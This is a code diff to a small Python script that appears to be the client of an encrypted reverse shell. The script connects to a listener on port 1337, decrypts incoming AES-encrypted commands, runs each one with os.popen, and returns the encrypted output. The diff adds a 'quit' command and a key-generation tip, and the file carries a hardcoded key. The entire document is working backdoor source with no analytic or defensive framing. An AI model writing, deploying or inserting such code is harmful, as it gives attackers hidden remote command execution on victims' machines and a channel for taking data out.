@@ -1,17 +1,18 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import base64
 import os
 import socket
+import sys
 
 from Crypto import Random
 from Crypto.Cipher import AES
 
 HOST = 'localhost'
 PORT = 1337
-BS   = 16
 KEY  = '82e672ae054aa4de6f042c888111686a'
+# generate your own key with...
+# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
 
 
 def pad(s):
@@ -35,10 +36,17 @@ def decrypt(ciphertext):
 def main():
     s = socket.socket()
     s.connect((HOST, PORT))
-    
+
     while True:
         data = s.recv(1024)
-        results = os.popen(decrypt(data)).read()
+        cmd = decrypt(data)
+
+        # stop client
+        if cmd == 'quit':
+            s.close()
+            sys.exit(0)
+
+        results = os.popen(cmd).read()
         s.sendall(encrypt(results))
 
 
